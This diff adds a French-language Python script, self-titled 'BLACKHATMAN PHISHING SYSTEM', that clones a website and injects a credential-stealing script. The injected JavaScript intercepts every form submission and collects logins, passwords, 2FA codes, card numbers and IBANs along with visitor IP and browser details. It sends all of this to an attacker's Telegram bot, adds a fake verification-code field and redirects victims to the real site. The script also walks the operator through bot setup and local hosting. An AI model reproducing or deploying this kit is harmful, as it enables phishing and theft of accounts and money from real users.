@@ -1,0 +1,604 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Site Cloner v10.0 - Clone complet + Injection Telegram Premium
+Usage: python site_cloner.py
+"""
+
+import os
+import sys
+import requests
+from urllib.parse import urljoin, urlparse, urldefrag
+from bs4 import BeautifulSoup
+import time
+import hashlib
+import re
+import socket
+import http.server
+import socketserver
+import mimetypes
+
+if sys.platform == "win32":
+    import io
+    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
+
+class SiteClonerV10:
+    def __init__(self, url, output_dir):
+        self.url = url.rstrip('/')
+        self.output_dir = output_dir
+        self.domain = urlparse(url).netloc
+        self.downloaded = set()
+        self.downloaded_urls = set()
+        self.asset_map = {}
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'fr,fr-FR;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+        })
+        
+    def get_extension(self, url, content_type):
+        
+        url_lower = url.lower()
+        content_type = content_type.lower()
+        
+        # Extensions par URL
+        extensions_map = {
+            '.css': '.css', '.js': '.js', '.mjs': '.js',
+            '.png': '.png', '.jpg': '.jpg', '.jpeg': '.jpg', '.jfif': '.jpg',
+            '.gif': '.gif', '.svg': '.svg', '.webp': '.webp', '.ico': '.ico',
+            '.woff2': '.woff2', '.woff': '.woff', '.ttf': '.ttf', '.eot': '.eot',
+            '.otf': '.otf', '.mp4': '.mp4', '.mp3': '.mp3', '.pdf': '.pdf',
+            '.xml': '.xml', '.json': '.json', '.txt': '.txt'
+        }
+        
+        for ext, mapped in extensions_map.items():
+            if url_lower.endswith(ext):
+                return mapped
+        
+        # Par content-type
+        if 'css' in content_type: return '.css'
+        if 'javascript' in content_type or 'js' in content_type: return '.js'
+        if 'png' in content_type: return '.png'
+        if 'jpeg' in content_type or 'jpg' in content_type: return '.jpg'
+        if 'gif' in content_type: return '.gif'
+        if 'svg' in content_type: return '.svg'
+        if 'webp' in content_type: return '.webp'
+        if 'x-icon' in content_type or 'ico' in content_type: return '.ico'
+        if 'woff2' in content_type: return '.woff2'
+        if 'woff' in content_type: return '.woff'
+        if 'ttf' in content_type: return '.ttf'
+        if 'eot' in content_type: return '.eot'
+        if 'otf' in content_type: return '.otf'
+        if 'mp4' in content_type: return '.mp4'
+        if 'mp3' in content_type: return '.mp3'
+        if 'pdf' in content_type: return '.pdf'
+        if 'xml' in content_type: return '.xml'
+        if 'json' in content_type: return '.json'
+        
+        return '.bin'
+    
+    def get_folder(self, ext):
+       
+        folder_map = {
+            '.css': 'css', '.js': 'js',
+            '.png': 'images', '.jpg': 'images', '.jpeg': 'images', '.gif': 'images',
+            '.svg': 'images', '.webp': 'images', '.ico': 'images',
+            '.woff2': 'fonts', '.woff': 'fonts', '.ttf': 'fonts', '.eot': 'fonts', '.otf': 'fonts',
+            '.mp4': 'videos', '.mp3': 'audios',
+            '.pdf': 'docs', '.xml': 'data', '.json': 'data'
+        }
+        return folder_map.get(ext, 'assets')
+    
+    def download_asset(self, url, base_url, retry=2):
+        
+        if url in self.downloaded_urls:
+            return self.asset_map.get(url)
+        
+        # Construit l'URL complète
+        full_url = urljoin(base_url, url)
+        full_url = full_url.split('#')[0].split('?')[0]
+        
+        for attempt in range(retry):
+            try:
+                response = self.session.get(full_url, timeout=15)
+                if response.status_code != 200:
+                    continue
+                
+                content_type = response.headers.get('content-type', '')
+                ext = self.get_extension(full_url, content_type)
+                folder = self.get_folder(ext)
+                
+                # Nom de fichier basé sur l'URL avec hash
+                url_hash = hashlib.md5(full_url.encode()).hexdigest()[:12]
+                filename = f"{url_hash}{ext}"
+                local_path = os.path.join(folder, filename)
+                full_path = os.path.join(self.output_dir, local_path)
+                
+                os.makedirs(os.path.dirname(full_path), exist_ok=True)
+                
+                with open(full_path, 'wb') as f:
+                    f.write(response.content)
+                
+                self.downloaded_urls.add(url)
+                self.asset_map[url] = local_path
+                return local_path
+                
+            except Exception:
+                continue
+        
+        return None
+    
+    def extract_all_assets(self, html, base_url):
+        
+        soup = BeautifulSoup(html, 'html.parser')
+        asset_count = 0
+        
+        # 1. CSS (link rel="stylesheet")
+        for tag in soup.find_all('link', rel='stylesheet'):
+            href = tag.get('href')
+            if href:
+                local = self.download_asset(href, base_url)
+                if local:
+                    tag['href'] = local
+                    asset_count += 1
+        
+        # 2. Preconnect et d'autres liens
+        for tag in soup.find_all('link', href=True):
+            href = tag.get('href')
+            if href and any(x in href for x in ['.css', '.js', '.ico', '.png', '.jpg']):
+                if tag.get('rel') not in ['stylesheet']:
+                    local = self.download_asset(href, base_url)
+                    if local:
+                        tag['href'] = local
+                        asset_count += 1
+        
+        # 3. JavaScript
+        for tag in soup.find_all('script', src=True):
+            src = tag.get('src')
+            if src:
+                local = self.download_asset(src, base_url)
+                if local:
+                    tag['src'] = local
+                    asset_count += 1
+        
+        # 4. Images
+        for tag in soup.find_all('img', src=True):
+            src = tag.get('src')
+            if src and not src.startswith('data:'):
+                local = self.download_asset(src, base_url)
+                if local:
+                    tag['src'] = local
+                    asset_count += 1
+        
+        # 5. Images srcset
+        for tag in soup.find_all('img', srcset=True):
+            srcset = tag.get('srcset')
+            if srcset:
+                new_srcset = []
+                for part in srcset.split(','):
+                    part = part.strip()
+                    if part:
+                        url_part = part.split()[0]
+                        if not url_part.startswith('data:'):
+                            local = self.download_asset(url_part, base_url)
+                            if local:
+                                rest = ' '.join(part.split()[1:]) if len(part.split()) > 1 else ''
+                                new_srcset.append(f"{local} {rest}".strip())
+                            else:
+                                new_srcset.append(part)
+                        else:
+                            new_srcset.append(part)
+                if new_srcset:
+                    tag['srcset'] = ', '.join(new_srcset)
+                    asset_count += 1
+        
+        # 6. Favicon et icônes
+        for tag in soup.find_all('link', rel=['icon', 'shortcut icon', 'apple-touch-icon']):
+            href = tag.get('href')
+            if href:
+                local = self.download_asset(href, base_url)
+                if local:
+                    tag['href'] = local
+                    asset_count += 1
+        
+        # 7. Polices et backgrounds dans CSS
+        url_pattern = re.compile(r'url\([\'"]?([^\'"\)]+)[\'"]?\)', re.IGNORECASE)
+        
+        def replace_url_in_style(match, base_url):
+            font_url = match.group(1)
+            if font_url and not font_url.startswith('data:') and not font_url.startswith('http'):
+                local = self.download_asset(font_url, base_url)
+                if local:
+                    return f"url('{local}')"
+            return match.group(0)
+        
+        # Dans les styles inline
+        for tag in soup.find_all(style=True):
+            if tag.get('style'):
+                def replacer(m):
+                    return replace_url_in_style(m, base_url)
+                tag['style'] = url_pattern.sub(replacer, tag['style'])
+        
+        # Dans les balises style
+        for tag in soup.find_all('style'):
+            if tag.string:
+                def replacer(m):
+                    return replace_url_in_style(m, base_url)
+                tag.string = url_pattern.sub(replacer, tag.string)
+        
+        # 8. Videos et audios
+        for tag in soup.find_all(['video', 'audio'], src=True):
+            src = tag.get('src')
+            if src:
+                local = self.download_asset(src, base_url)
+                if local:
+                    tag['src'] = local
+                    asset_count += 1
+        
+        # 9. Source tags
+        for tag in soup.find_all('source', src=True):
+            src = tag.get('src')
+            if src:
+                local = self.download_asset(src, base_url)
+                if local:
+                    tag['src'] = local
+                    asset_count += 1
+        
+        # 10. Object et embed
+        for tag in soup.find_all(['object', 'embed'], src=True):
+            src = tag.get('src')
+            if src:
+                local = self.download_asset(src, base_url)
+                if local:
+                    tag['src'] = local
+                    asset_count += 1
+        
+        return str(soup), asset_count
+    
+    def clone(self):
+        
+        print(f"\n{'='*60}")
+        print(f"  🚀 CLONAGE DU SITE")
+        print(f"{'='*60}")
+        print(f"  🌐 URL: {self.url}")
+        print(f"  📁 Destination: {self.output_dir}/")
+        print(f"{'='*60}\n")
+        
+        # Crée tous les dossiers
+        for folder in ['css', 'js', 'images', 'fonts', 'videos', 'audios', 'docs', 'data', 'assets']:
+            os.makedirs(os.path.join(self.output_dir, folder), exist_ok=True)
+        
+        try:
+            print("[*] Téléchargement de la page principale...")
+            response = self.session.get(self.url, timeout=20)
+            if response.status_code != 200:
+                print(f"[!] Erreur HTTP: {response.status_code}")
+                return False, None
+            
+            html = response.text
+            
+            # Traite la page et ses assets
+            print("[*] Extraction et téléchargement des assets...")
+            processed_html, asset_count = self.extract_all_assets(html, self.url)
+            
+            # Sauvegarde la page principale
+            main_file = "index.html"
+            full_path = os.path.join(self.output_dir, main_file)
+            with open(full_path, 'w', encoding='utf-8') as f:
+                f.write(processed_html)
+            
+            print(f"\n{'='*60}")
+            print(f"  ✅ CLONAGE TERMINÉ AVEC SUCCÈS")
+            print(f"{'='*60}")
+            print(f"  📄 Page: index.html")
+            print(f"  📦 Assets: {asset_count} fichiers")
+            print(f"  📁 Dossier: {self.output_dir}/")
+            print(f"{'='*60}")
+            
+            return True, full_path
+            
+        except Exception as e:
+            print(f"[!] Erreur: {e}")
+            return False, None
+
+
+def test_telegram_bot(token, chat_id):
+    
+    try:
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        msg = {
+            "chat_id": chat_id,
+            "text": "🤖 *BLACKHATMAN PHISHING SYSTEM* 🤖\n\n✅ *BOT ACTIVÉ AVEC SUCCÈS*\n\n📊 *Statut:* Opérationnel\n🎯 *Mode:* Prêt à capturer\n🔐 *Sécurité:* Active\n\n⚠️ *Toutes les données seront transmises ici*",
+            "parse_mode": "Markdown"
+        }
+        r = requests.post(url, json=msg, timeout=10)
+        return r.status_code == 200
+    except:
+        return False
+
+
+def inject_phishing(page_path, site_url, bot_token, chat_id):
+    
+    try:
+        with open(page_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+        
+        domain = urlparse(site_url).netloc
+        site_name = domain.replace('www.', '').split('.')[0].upper()
+        
+        script = f'''
+<script>
+const BOT_TOKEN = "{bot_token}";
+const CHAT_ID = "{chat_id}";
+let step = 1;
+let creds = {{}};
+
+function sendToTelegram(msg) {{
+    fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage`, {{
+        method: "POST",
+        headers: {{"Content-Type": "application/json"}},
+        body: JSON.stringify({{chat_id: CHAT_ID, text: msg, parse_mode: "Markdown"}})
+    }});
+}}
+
+function formatMessage(type, data) {{
+    let date = new Date();
+    let formattedDate = date.toLocaleString('fr-FR');
+    
+    if(type === 'visit') {{
+        return `🌐 *NOUVELLE VICTIME* 🌐\\n━━━━━━━━━━━━━━━━━━━━\\n📡 *IP:* ${{data.ip}}\\n💻 *OS:* ${{data.os}}\\n🌍 *Navigateur:* ${{data.browser}}\\n🕐 *Heure:* ${{formattedDate}}\\n━━━━━━━━━━━━━━━━━━━━`;
+    }}
+    else if(type === 'credentials') {{
+        let msg = `🔐 *{site_name} - DONNÉES CAPTURÉES* 🔐\\n━━━━━━━━━━━━━━━━━━━━\\n📧 *Login:* ${{data.login}}\\n🔑 *Password:* ${{data.password}}`;
+        if(data.mfa) msg += `\\n📱 *2FA Code:* ${{data.mfa}}`;
+        if(data.card) msg += `\\n💳 *Carte Bancaire:* ${{data.card}}`;
+        if(data.iban) msg += `\\n🏦 *IBAN:* ${{data.iban}}`;
+        msg += `\\n━━━━━━━━━━━━━━━━━━━━\\n🕐 *${{formattedDate}}*`;
+        return msg;
+    }}
+    return msg;
+}}
+
+// Détection OS et navigateur
+function getBrowserInfo() {{
+    let ua = navigator.userAgent;
+    let browser = "Inconnu";
+    let os = "Inconnu";
+    
+    if (ua.includes("Chrome")) browser = "Chrome";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Safari")) browser = "Safari";
+    else if (ua.includes("Edge")) browser = "Edge";
+    
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac")) os = "macOS";
+    else if (ua.includes("Linux")) os = "Linux";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone")) os = "iOS";
+    
+    return {{browser, os}};
+}}
+
+// Capture IP et infos
+fetch("https://api.ipify.org?format=json")
+    .then(r => r.json())
+    .then(d => {{
+        let info = getBrowserInfo();
+        sendToTelegram(formatMessage('visit', {{
+            ip: d.ip,
+            os: info.os,
+            browser: info.browser
+        }}));
+    }})
+    .catch(() => {{}});
+
+document.addEventListener("DOMContentLoaded", function() {{
+    let forms = document.querySelectorAll("form");
+    
+    forms.forEach(form => {{
+        form.addEventListener("submit", function(e) {{
+            e.preventDefault();
+            
+            let loginField = form.querySelector('input[type="email"], input[name*="email"], input[name*="login"], input[name*="user"], input[name*="username"]');
+            let passField = form.querySelector('input[type="password"]');
+            let mfaField = form.querySelector('input[name*="code"], input[name*="mfa"], input[name*="otp"], input[name*="2fa"]');
+            let cardField = form.querySelector('input[name*="card"], input[name*="carte"], input[name*="ccnumber"]');
+            let ibanField = form.querySelector('input[name*="iban"], input[name*="compte"]');
+            
+            if(step === 1 && passField) {{
+                creds.login = loginField ? loginField.value : "Non fourni";
+                creds.password = passField.value;
+                if(cardField) creds.card = cardField.value;
+                if(ibanField) creds.iban = ibanField.value;
+                
+                sendToTelegram(formatMessage('credentials', creds));
+                
+                if(mfaField) {{
+                    step = 2;
+                    alert("📱 Code de vérification envoyé par SMS");
+                    mfaField.style.display = "block";
+                    mfaField.required = true;
+                    mfaField.focus();
+                }} else {{
+                    alert("✅ Connexion réussie ! Redirection en cours...");
+                    setTimeout(() => window.location.href = "{site_url}", 1500);
+                }}
+                
+            }} else if(step === 2 && mfaField) {{
+                creds.mfa = mfaField.value;
+                sendToTelegram(formatMessage('credentials', creds));
+                alert("✅ Connexion réussie ! Redirection en cours...");
+                setTimeout(() => window.location.href = "{site_url}", 1500);
+            }}
+        }});
+    }});
+    
+    // Ajoute champ MFA si nécessaire
+    if(!document.querySelector('input[name*="code"], input[name*="mfa"]')) {{
+        let firstForm = document.querySelector('form');
+        if(firstForm) {{
+            let mfaDiv = document.createElement('div');
+            mfaDiv.id = "mfaContainer";
+            mfaDiv.style.display = "none";
+            mfaDiv.style.marginTop = "20px";
+            mfaDiv.style.padding = "15px";
+            mfaDiv.style.background = "#f8f9fa";
+            mfaDiv.style.borderRadius = "10px";
+            mfaDiv.style.border = "1px solid #e9ecef";
+            mfaDiv.innerHTML = `
+                <label style="display:block; margin-bottom:8px; font-weight:600;">📱 Code de vérification (2FA)</label>
+                <input type="text" id="mfaInput" placeholder="000000" style="width:100%; padding:12px; border:2px solid #dee2e6; border-radius:8px; font-size:16px;">
+            `;
+            let submitBtn = firstForm.querySelector('button[type="submit"], input[type="submit"]');
+            if(submitBtn) {{
+                firstForm.insertBefore(mfaDiv, submitBtn);
+            }} else {{
+                firstForm.appendChild(mfaDiv);
+            }}
+        }}
+    }}
+}});
+</script>
+'''
+        
+        if '</body>' in content:
+            content = content.replace('</body>', script + '\n</body>')
+        else:
+            content += script
+        
+        with open(page_path, 'w', encoding='utf-8') as f:
+            f.write(content)
+        
+        return True
+    except Exception as e:
+        print(f"  ✗ Erreur injection: {e}")
+        return False
+
+
+def start_server(directory, port):
+    
+    os.chdir(directory)
+    
+    print(f"\n{'='*60}")
+    print(f"  🌐 SERVEUR DE TEST ACTIF")
+    print(f"{'='*60}")
+    print(f"  📁 Dossier: {directory}")
+    print(f"  🔗 URL: http://localhost:{port}/")
+    print(f"  📄 Page: http://localhost:{port}/index.html")
+    print(f"\n  ⚠️  TOUTES LES DONNÉES SERONT ENVOYÉES À TELEGRAM")
+    print(f"  📊 Données capturées: IP, OS, Navigateur, Identifiants, 2FA")
+    print(f"  📌 Pour arrêter le serveur: Ctrl+C")
+    print(f"{'='*60}\n")
+    
+    try:
+        handler = http.server.SimpleHTTPRequestHandler
+        with socketserver.TCPServer(("", port), handler) as httpd:
+            httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\n\n[!] Serveur arrêté")
+    except Exception as e:
+        print(f"\n[!] Erreur serveur: {e}")
+
+
+def main():
+    print("\n" + "="*60)
+    print("  🤖 BLACKHATMAN PHISHING SYSTEM v10.0")
+    print("  🔐 Clone parfait + Injection Telegram Premium")
+    print("="*60)
+    
+    try:
+        # Demande l'URL
+        url = input("\n🌐 URL du site à cloner: ").strip()
+        if not url:
+            print("[!] URL requise")
+            input("\nAppuyez sur Entrée...")
+            sys.exit(1)
+        
+        if not url.startswith(('http://', 'https://')):
+            url = 'https://' + url
+        
+        # Dossier de sortie
+        default_folder = urlparse(url).netloc.replace('www.', '').replace('.', '_')
+        output = input(f"📁 Dossier (défaut: {default_folder}): ").strip()
+        if not output:
+            output = default_folder
+        
+        # Clone
+        cloner = SiteClonerV10(url, output)
+        success, page_path = cloner.clone()
+        
+        if not success:
+            print("[!] Échec du clonage")
+            input("\nAppuyez sur Entrée...")
+            sys.exit(1)
+        
+        # Telegram
+        print("\n" + "="*60)
+        print("  🤖 CONFIGURATION TELEGRAM")
+        print("="*60)
+        print("\n📌 *CRÉATION D'UN BOT:*")
+        print("   1. Ouvrez Telegram et cherchez @BotFather")
+        print("   2. Envoyez /newbot et suivez les instructions")
+        print("   3. Récupérez le TOKEN")
+        print("   4. Envoyez un message à votre bot")
+        print("   5. Visitez: https://api.telegram.org/botVOTRE_TOKEN/getUpdates")
+        print("      pour obtenir votre CHAT_ID\n")
+        
+        bot_token = input("🤖 Token du bot Telegram: ").strip()
+        chat_id = input("📱 Chat ID: ").strip()
+        
+        if bot_token and chat_id:
+            print("\n[*] Test de connexion au bot...")
+            if test_telegram_bot(bot_token, chat_id):
+                print("  ✅ Bot connecté avec succès!")
+                print("\n[*] Injection du code de phishing...")
+                if inject_phishing(page_path, url, bot_token, chat_id):
+                    print("  ✅ Page injectée avec succès!")
+                    print("\n  📊 *DONNÉES CAPTURÉES:*")
+                    print("     • Adresse IP")
+                    print("     • Système d'exploitation")
+                    print("     • Navigateur")
+                    print("     • Identifiants de connexion")
+                    print("     • Codes 2FA")
+                    print("     • Informations bancaires (si présentes)")
+            else:
+                print("  ❌ Échec de connexion au bot. Vérifiez le token et le chat_id")
+        else:
+            print("\n[!] Pas de configuration Telegram, site cloné sans phishing")
+        
+        # Lancement
+        print("\n" + "="*60)
+        start = input("🚀 Lancer le serveur de test maintenant ? (o/n): ").strip().lower()
+        
+        if start in ('o', 'oui', 'y', 'yes'):
+            port = 8080
+            start_server(output, port)
+        else:
+            print(f"\n{'='*60}")
+            print(f"  ✅ CONFIGURATION TERMINÉE")
+            print(f"{'='*60}")
+            print(f"  📁 Dossier: {output}/")
+            print(f"  📄 Page: index.html")
+            print(f"\n  📌 *POUR TESTER PLUS TARD:*")
+            print(f"     cd {output}")
+            print(f"     python -m http.server 8080")
+            print(f"     puis http://localhost:8080")
+            print(f"{'='*60}")
+            input("\nAppuyez sur Entrée pour quitter...")
+            
+    except KeyboardInterrupt:
+        print("\n\n[!] Programme interrompu")
+    except Exception as e:
+        print(f"\n[!] Erreur: {e}")
+        input("\nAppuyez sur Entrée...")
+
+
+if __name__ == "__main__":
+    main()
